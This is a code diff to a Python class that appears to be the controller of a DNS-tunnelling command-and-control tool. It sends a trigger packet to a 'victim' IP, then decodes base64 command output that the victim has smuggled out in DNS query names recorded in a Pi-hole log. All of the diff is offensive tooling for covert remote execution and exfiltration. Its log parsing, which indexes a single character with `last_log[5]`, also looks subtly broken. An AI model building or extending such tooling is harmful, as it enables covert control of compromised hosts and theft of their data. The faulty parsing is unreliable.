@@ -25,6 +25,7 @@ DNS_IP = "10.150.0.8"
 DNS_PORT = 53
 DNS_SIGNAL_PORT = 1004
 DNS_RECORD_FILE = '/etc/dnsmasq.d/02-lan.conf'
+DNS_LOG_FILE = '/var/log/pihole.log'
 
 class TryLoop:
 
@@ -106,11 +107,25 @@ class TryLoop:
         exec_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         exec_sock.sendto("1".encode('utf-8'), (self.victim_details['ip'], DNS_PORT))
         print("Receiving output from", self.victim_details['ip'], "...")
-        data, addr = sock.recvfrom(512)
-        out = (b64decode(data)).decode('utf-8', errors='ignore')
+        sock.recvfrom(512)
+        #data, addr = sock.recvfrom(512)
+        #out = (b64decode(data)).decode('utf-8', errors='ignore')
+        out = self._get_output()
         print("Instruction output:", out)
         return out
 
+    def _get_output(self):
+        log = open(DNS_LOG_FILE, "r")
+        last_log = log.readlines()[-1]
+        url = last_log[5]
+        parts = url.split('.')
+        if (parts[0] == "none"):
+            return ""
+        output = ""
+        for part in parts:
+            output += part
+        output = b64decode(output).decode('utf-8', errors='ignore')
+        return output
 
 
     # utils
